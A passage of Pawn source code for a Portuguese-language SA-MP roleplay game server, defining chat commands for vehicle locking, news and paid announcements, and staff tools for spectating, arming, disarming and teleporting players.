					SendClientMessage(playerid, COR_ERRO, "Esse jogador já possui habilitação terrestre!");
					return 1;
			 	}
				format(gstring, sizeof(gstring), "Você deu uma habilitação terrestre para %s", PlayerName(id));
				SendClientMessage(playerid, COR_AMARELO, gstring);
   				format(gstring, sizeof(gstring), "Você recebeu uma habilitação terrestre de %s", PlayerName(playerid));
				SendClientMessage(id, COR_AMARELO, gstring);
				WE_SetInt(f(id), "HabT", 1);
				pInfo[id][HabT] = 1;
			}
			else if(!strcmp(tmp, "nautica", true))
			{
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COR_ERRO, "Uso válido: /v Nautica [ID]");
					return 1;
				}
				new
					id = strval(tmp)
				;
			  	if(pInfo[id][HabN] == 1)
				{
					SendClientMessage(playerid, COR_ERRO, "Esse jogador já possui habilitação náutica!");
					return 1;
			 	}
				format(gstring, sizeof(gstring), "Você deu uma habilitação náutica para %s", PlayerName(id));
				SendClientMessage(playerid, COR_AMARELO, gstring);
   				format(gstring, sizeof(gstring), "Você recebeu uma habilitação náutica de %s", PlayerName(playerid));
				SendClientMessage(id, COR_AMARELO, gstring);
				WE_SetInt(f(id), "HabN", 1);
				pInfo[id][HabN] = 1;
			}
			else if(!strcmp(tmp, "aerea", true))
			{
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COR_ERRO, "Uso válido: /v Aerea [ID]");
					return 1;
				}
				new
					id = strval(tmp)
				;
			  	if(pInfo[id][HabA] == 1)
				{
					SendClientMessage(playerid, COR_ERRO, "Esse jogador já possui habilitação aérea!");
					return 1;
			 	}
				format(gstring, sizeof(gstring), "Você deu uma habilitação aérea para %s", PlayerName(id));
				SendClientMessage(playerid, COR_AMARELO, gstring);
   				format(gstring, sizeof(gstring), "Você recebeu uma habilitação aérea de %s", PlayerName(playerid));
				SendClientMessage(id, COR_AMARELO, gstring);
				WE_SetInt(f(id), "HabA", 1);
				pInfo[id][HabA] = 1;
			}
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Instrutor(a)!");
		}
		return 1;
	}*/
	if(!strcmp(cmd, "/veiculo", true))
	{
		if(!IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COR_ERRO, "Você não está em um veículo!");
			return 1;
		}
		tmp = strtok(cmdtext, idx);
  		if(!strlen(tmp))
  		{
  		    SendClientMessage(playerid, COR_AMARELO, "Opções: (Trancar, Destrancar)");
  		    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Veiculo [Opção]");
			return 1;
		}
		new
			v = GetPlayerVehicleID(playerid)
		;
  		if(vHouse[v] == 1)
		{
			SendClientMessage(playerid, COR_ERRO, "Não é permitido trancar veículo casa!");
			SendClientMessage(playerid, COR_AMARELO, "Em breve donos poderão trancar.");
			return 1;
		}
		if(v == 538)
		{
			SendClientMessage(playerid, COR_ERRO, "Não é permitido trancar o trem!");
			return 1;
		}
		new
			Float:i_x, Float:i_y, Float:i_z
		;
		GetPlayerPos(playerid, i_x, i_y, i_z);
		if(!strcmp(tmp, "trancar", true))
		{
			foreach(Player, i)
			{
				if(i != playerid)
				{
					SetVehicleParamsForPlayer(v, i,0,1);
				}
			}
			SendClientMessage(playerid, COR_AMARELO, "Veículo trancado!");
			PlayerPlaySound(playerid, 1056, i_x, i_y, i_z);
		}
		else if(!strcmp(tmp, "destrancar", true))
		{
       		foreach(Player, i)
       		{
       			SetVehicleParamsForPlayer(v, i,0,0);
			}
			SendClientMessage(playerid, COR_AMARELO, "Veículo destrancado!");
			PlayerPlaySound(playerid, 1056, i_x, i_y, i_z);
		}
		return 1;
	}
	if(!strcmp(cmd, "/noticia", true))
	{
	    if(pInfo[playerid][Prof] == REPORTER || aInfo[playerid][Admin] == 1)
		{
          	if(Anunciou[playerid] > gettime())
			{
			    format(gStr, sizeof(gStr), "Aguarde %d segundos para dar uma nova notícia!", Anunciou[playerid] - gettime());
			    SendClientMessage(playerid, COR_ERRO, gStr);
				return 1;
			}
		   	new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
		  	if(!strlen(result))
			{
		      	SendClientMessage(playerid, COR_ERRO, "Uso válido: /Noticia [Mensagem]");
			  	return 1;
			}
			format(gstring, sizeof(gstring), "{6666FF} {FFFFFF}O(A) Repórter %s informa à notícia: {6666FF}%s", PlayerName(playerid), result);
			SendClientMessageToAll(COR_BRANCO, gstring);
	   		Anunciou[playerid] = gettime() + 180;
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) repórter!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/anunciar", true) || !strcmp(cmd, "/anuncio", true))
	{
	    if(pInfo[playerid][Level] < 5)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Para enviar um anúncio você deve ter no mínimo 5 níveis!");
	        return 1;
	    }
		if(viwerAN[playerid] > gettime())
		{
			format(gStr, sizeof(gStr), "Aguarde %d segundos para fazer um novo anúncio!", viwerAN[playerid] - gettime());
			SendClientMessage(playerid, COR_ERRO, gStr);
			return 1;
		}
	    if(GetPlayerCash(playerid) < 300)
	    {
		    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para fazer um anúncio! (Necessário: R$300)");
		    return 1;
		}
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' '))
		{
			idx++;
		}
		new offset = idx;
		new result[64];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = cmdtext[idx];
			idx++;
		}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
		 	SendClientMessage(playerid, COR_ERRO, "Uso válido: /Anunciar [Mensagem]");
			return 1;
		}
		new
			viewer[512]
		;
		format(viewer, sizeof(viewer), "{FF7300} Anúncio de {FFFFFF}%s: {FF7300}%s {FFFFFF}- Contato via SMS: {1E90FF}%d", PlayerName(playerid), result, playerid);
		SendClientMessageToAll(COR_BRANCO, viewer);
		viwerAN[playerid] = gettime() + 120;
		sGivePlayerCash(playerid, -300);
   		return 1;
	}
	if(!strcmp(cmd, "/cartao", true))
	{
	    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));

		if(WE_GetInt(gFile, "Cartao") == 1)
		{
			tmp = strtok(cmdtext, idx);
	  		if(!strlen(tmp))
	  		{
	  		    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Cartao [ligar/desligar]");
				return 1;
			}
			if(!strcmp(tmp, "ligar", true))
			{
	            if(WE_GetInt(gFile, "CartaoStatus") == 1)
	            {
	                SendClientMessage(playerid, COR_ERRO, "Seu cartão de créditos já está ligado!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COR_AMARELO, "Cartão de créditos ligado com sucesso!");
					WE_SetInt(gFile, "CartaoStatus", 1);
					return 1;
				}
			}
			else if(!strcmp(tmp, "desligar", true))
			{
	            if(WE_GetInt(gFile, "CartaoStatus") == 0)
	            {
	                SendClientMessage(playerid, COR_ERRO, "Seu cartão de créditos já está desligado!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COR_AMARELO, "Cartão de créditos desligado com sucesso!");
					WE_SetInt(gFile, "CartaoStatus", 0);
					return 1;
				}
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem um Status Modelo!");
		    return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/usarcura", true))
	{
		if(pInfo[playerid][Tem_Cura] == 0)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem uma cura!");
		    return 1;
		}
		else if(pInfo[playerid][Tem_Cura] == 1)
		{
		    SendClientMessage(playerid, COR_ERRO, "Aguarde logo o efeito das drogas e bebidas irá passar ...");
            pInfo[playerid][Tem_Cura] = 0;
            SetTimerEx("PassarEfeitoCura", 15000, false, "i", playerid);
		    return 1;
		}
		return 1;
	}
    if(strcmp(cmd, "/ativarchat", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
		    SendClientMessageToAll(0xEEDC2DAA, "O chat foi ativado!");
            ChatStatus = 0;
		}
		return 1;
    }

    if(strcmp(cmd, "/desativarchat", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
		    SendClientMessageToAll(0xEEDC2DAA, "O chat foi desativado!");
	        ChatStatus = 1;
		}
		return 1;
    }

    if(strcmp(cmd, "/ativarcomandos", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
			SendClientMessageToAll(0xEEDC2DAA, "Os comandos foram ativados!");
			ComandosStatus = 0;
		}
		return 1;
    }
    if(strcmp(cmd, "/desativarcomandos", true) == 0)
    {
		if(aInfo[playerid][Admin] == 1)
		{
			SendClientMessageToAll(0xEEDC2DAA, "Os comandos foram desativados!");
			ComandosStatus = 1;
		}
		return 1;
    }
	if(strcmp(cmd, "/espiar", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /espiar [ID]");
			    return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
                SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	            return 1;
            }
            TogglePlayerSpectating(playerid, 1);
            if(!IsPlayerInAnyVehicle(id)) PlayerSpectatePlayer(playerid, id);
            else PlayerSpectateVehicle(playerid, GetPlayerVehicleID(id), SPECTATE_MODE_NORMAL);
            SetPlayerInterior(playerid, GetPlayerInterior(id));
		    SpectateType[playerid] = ADMIN_SPEC_TYPE_PLAYER;
		    SpectateID[playerid] = id;
		    GetPlayerName(id, giveplayer, sizeof(giveplayer));
            format(string, sizeof(string), "Você está espiando O(A) jogador(a) %s para parar de espiar: /espiarOFF", giveplayer);
            SendClientMessage(playerid, 0x1E90FFAA, string);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/espiarOFF", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
	 	{
            TogglePlayerSpectating(playerid, 0);
	        SpectateID[playerid] = INVALID_PLAYER_ID;
		    SpectateType[playerid] = ADMIN_SPEC_TYPE_NONE;
   			SpawnCasa(playerid);
			SetPlayerSkin(playerid, WE_GetInt(f(playerid), "Skin"));
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/dararmatodos", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COR_ERRO, "Uso válido: /dararmatodos [armaID] [munição]");
				return 1;
            }
            new
				arma = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COR_ERRO, "Uso válido: /dararmatodos [armaID] [munição]");
				return 1;
            }
            new
				municao = strval(tmp)
			;
			new
				gunname[128]
			;
          	foreach(Player, i)
            {
           		GivePlayerWeapon(i, arma, municao);
			}
  			GetWeaponName(arma, gunname, sizeof(gunname));
     		SendClientFormatAll(0x1E90FFAA, "O(A) administrador(a) %s deu a arma %s para todos!", PlayerName(playerid), gunname);
            return 1;
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			return 1;
		}
	}
	if(strcmp(cmd, "/dararma", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COR_ERRO, "Uso válido: /dararma [id / nome] [armaID] [munição]");
				return 1;
            }
            new id = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COR_ERRO, "Uso válido: /dararma [id / nome] [armaID] [munição]");
				return 1;
            }
            new arma = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COR_ERRO, "Uso válido: /dararma [id / nome] [armaID] [munição]");
				return 1;
            }
            new municao = strval(tmp);
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
		    if(aInfo[playerid][Oculto] == false)
		    {
				new gunname[128];
                GetWeaponName(arma, gunname, sizeof(gunname));
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s lhe deu a arma %s", sendername, gunname);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você deu a arma %s para o(a) jogador(a) %s", gunname, giveplayer);
                SendClientMessage(playerid, 0x1E90FFAA, string);
		    }
            GivePlayerWeapon(id, arma, municao);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/desarmar", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /desarmar [ID]");
			    return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
                SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	            return 1;
            }
            if(aInfo[playerid][Oculto] == false)
            {
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) administrador(a) %s retirou todas suas armas", sendername);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você retirou todas as armas do(a) jogador(a) %s", giveplayer);
                SendClientMessage(playerid, 0x1E90FFAA, string);
            }
            ResetPlayerWeapons(id);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/desarmartodos", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1)
		{
            foreach(Player, i)
            {
            	if(aInfo[playerid][Oculto] == false)
				{
				  	ResetPlayerWeapons(i);
					SendClientMessage(playerid, 0x1E90FFAA, "Você desarmou todos os jogadores conectados ao servidor.");
				}
            }
            SendClientMessageToAll(0x1E90FFAA, "O adminstrador desarmou todos!");
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/irveiculo", true) == 0)
	{
	    if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /irveiculo [id do veículo]");
				return 1;
            }
            new veiculo = strval(tmp);
            if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
            {
                new Float:vx, Float:vy, Float:vz;
                GetVehiclePos(veiculo, vx, vy, vz);
                SetVehiclePos(GetPlayerVehicleID(playerid), vx, vy+2, vz);
            }
            else
            {
                new vehicleid = GetPlayerVehicleID(playerid);
                new Float:vx, Float:vy, Float:vz;
                GetVehiclePos(veiculo, vx, vy, vz);
                SetPlayerPos(playerid, vx, vy, vz+1);
		        SetPlayerInterior(playerid, 0);
                format(string, sizeof(string), "Você se teleportou até o veículo %s (ID: %d)", vNome[GetVehicleModel(vehicleid)-400], veiculo);
                SendClientMessage(playerid, 0x1E90FFAA, string);
			}
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/ir", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /ir [ID]");
				return 1;
            }
            giveplayerid = strval(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
                {
					if(aInfo[playerid][Oculto] == false)
					{
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        if(aInfo[playerid][Admin] == 1)
                        {
	                        format(string, sizeof(string), "O(A) administrador(a) %s se teleportou até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
						}
						else if(aInfo[playerid][Moderador] == 1)
						{
     						format(string, sizeof(string), "O(A) moderador(a) %s se teleportou até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
						}
 						else if(aInfo[playerid][Ajudante] == 1)
						{
     						format(string, sizeof(string), "O(A) ajudante %s se teleportou até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
						}
 						else if(aInfo[playerid][Corregedor] == 1)
						{
     						format(string, sizeof(string), "O(A) corregedor(a) %s se teleportou até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
						}
                        format(string, sizeof(string), "Você se teleportou até a localização do(a) jogador(a) %s", giveplayer);
                        SendClientMessage(playerid, 0x1E90FFAA, string);
					}
                    new Float:px, Float:py, Float:pz;
                    new vehicleid = GetPlayerVehicleID(playerid);
                    new interiorp = GetPlayerInterior(giveplayerid);
                    new vWorld = GetPlayerVirtualWorld(giveplayerid);
                    GetPlayerPos(giveplayerid, px, py, pz);
                    SetVehiclePos(vehicleid, px, py+1, pz);
					SetPlayerInterior(playerid, interiorp);
					SetPlayerVirtualWorld(playerid, vWorld);
                }
                else
                {
					if(aInfo[playerid][Oculto] == false)
					{
					    if(aInfo[playerid][Admin] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) administrador(a) %s se teleportou até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você se teleportou até a localização do(a) jogador(a) %s", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
                        else if(aInfo[playerid][Moderador] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) moderador(a) %s se teleportou até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você se teleportou até a localização do(a) jogador(a) %s", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
                        else if(aInfo[playerid][Ajudante] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) ajudante %s se teleportou até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você se teleportou até a localização do(a) jogador(a) %s", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
                        else if(aInfo[playerid][Corregedor] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) corregedor(a) %s se teleportou até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você se teleportou até a localização do(a) jogador(a) %s", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
					}
					new Float:px, Float:py, Float:pz;
                    new vehicleid = GetPlayerVehicleID(playerid);
                    GetPlayerPos(giveplayerid, px, py, pz);
                    SetPlayerPos(playerid, px, py+1, pz);
                    SetVehiclePos(vehicleid, px, py+1, pz);
                    SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
                    SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
                }
            }
            else
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
            }
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/ir", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /ir [ID]");
				return 1;
            }
            giveplayerid = strval(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
                {
					if(aInfo[playerid][Oculto] == false)
					{
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        if(aInfo[playerid][Admin] == 1)
                        {
	                        format(string, sizeof(string), "O(A) administrador(a) %s se teleportou até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
						}
						else if(aInfo[playerid][Moderador] == 1)
						{
     						format(string, sizeof(string), "O(A) moderador(a) %s se teleportou até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
						}
 						else if(aInfo[playerid][Ajudante] == 1)
						{
     						format(string, sizeof(string), "O(A) ajudante %s se teleportou até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
						}
 						else if(aInfo[playerid][Corregedor] == 1)
						{
     						format(string, sizeof(string), "O(A) corregedor(a) %s se teleportou até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
						}
                        format(string, sizeof(string), "Você se teleportou até a localização do(a) jogador(a) %s", giveplayer);
                        SendClientMessage(playerid, 0x1E90FFAA, string);
					}
                    new Float:px, Float:py, Float:pz;
                    new vehicleid = GetPlayerVehicleID(playerid);
                    new interiorp = GetPlayerInterior(giveplayerid);
                    new vWorld = GetPlayerVirtualWorld(giveplayerid);
                    GetPlayerPos(giveplayerid, px, py, pz);
                    SetVehiclePos(vehicleid, px, py+1, pz);
					SetPlayerInterior(playerid, interiorp);
					SetPlayerVirtualWorld(playerid, vWorld);
                }
                else
                {
					if(aInfo[playerid][Oculto] == false)
					{
					    if(aInfo[playerid][Admin] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) administrador(a) %s se teleportou até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você se teleportou até a localização do(a) jogador(a) %s", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
                        else if(aInfo[playerid][Moderador] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) moderador(a) %s se teleportou até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você se teleportou até a localização do(a) jogador(a) %s", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
                        else if(aInfo[playerid][Ajudante] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) ajudante %s se teleportou até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você se teleportou até a localização do(a) jogador(a) %s", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
                        else if(aInfo[playerid][Corregedor] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) corregedor(a) %s se teleportou até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você se teleportou até a localização do(a) jogador(a) %s", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
					}
					new Float:px, Float:py, Float:pz;
                    new vehicleid = GetPlayerVehicleID(playerid);
                    GetPlayerPos(giveplayerid, px, py, pz);
                    SetPlayerPos(playerid, px, py+1, pz);
                    SetVehiclePos(vehicleid, px, py+1, pz);
                    SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
                    SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
                }
            }
            else
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
            }
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(strcmp(cmd, "/trazer", true) == 0)
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /trazer [ID]");
				return 1;
            }
            giveplayerid = strval(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(GetPlayerState(giveplayerid) == PLAYER_STATE_DRIVER)
                {
					if(aInfo[playerid][Oculto] == false)
					{
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        if(aInfo[playerid][Admin] == 1)
                        {
	                        format(string, sizeof(string), "O(A) administrador(a) %s trouxe você até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        }
                        else if(aInfo[playerid][Moderador] == 1)
                        {
      						format(string, sizeof(string), "O(A) moderador(a) %s trouxe você até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        }
                        else if(aInfo[playerid][Ajudante] == 1)
                        {
      						format(string, sizeof(string), "O(A) ajudante %s trouxe você até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        }
                        else if(aInfo[playerid][Corregedor] == 1)
                        {
      						format(string, sizeof(string), "O(A) corregedor(a) %s trouxe você até sua localização", sendername);
	                        SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        }
                        format(string, sizeof(string), "Você trouxe o(a) jogador(a) %s até sua localização", giveplayer);
                        SendClientMessage(playerid, 0x1E90FFAA, string);
					}
					new Float:px, Float:py, Float:pz;
                    new vehicleid = GetPlayerVehicleID(giveplayerid);
                    new interiorp = GetPlayerInterior(playerid);
                    new vWorld = GetPlayerVirtualWorld(playerid);
                    SetPlayerVirtualWorld(giveplayerid, vWorld);
                    SetPlayerInterior(giveplayerid, interiorp);
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPos(giveplayerid, px, py+1, pz);
                    SetVehiclePos(vehicleid, px, py+1, pz);
                }
                else
                {
					if(aInfo[playerid][Oculto] == false)
					{
					    if(aInfo[playerid][Moderador] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O moderador %s trouxe você até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você trouxe o(a) jogador(a) %s até sua localização", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
                        if(aInfo[playerid][Admin] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) administrador(a) %s trouxe você até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você trouxe o(a) jogador(a) %s até sua localização", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
                        if(aInfo[playerid][Ajudante] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) ajudante %s trouxe você até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você trouxe o(a) jogador(a) %s até sua localização", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
                        if(aInfo[playerid][Corregedor] == 1)
					    {
                        	GetPlayerName(playerid, sendername, sizeof(sendername));
                        	GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        	format(string, sizeof(string), "O(A) corregedor(a) %s trouxe você até sua localização", sendername);
                        	SendClientMessage(giveplayerid, 0x1E90FFAA, string);
                        	format(string, sizeof(string), "Você trouxe o(a) jogador(a) %s até sua localização", giveplayer);
                        	SendClientMessage(playerid, 0x1E90FFAA, string);
                        }
					}
					new Float:px, Float:py, Float:pz;
                    new vehicleid = GetPlayerVehicleID(giveplayerid);
                    new interiorp = GetPlayerInterior(playerid);
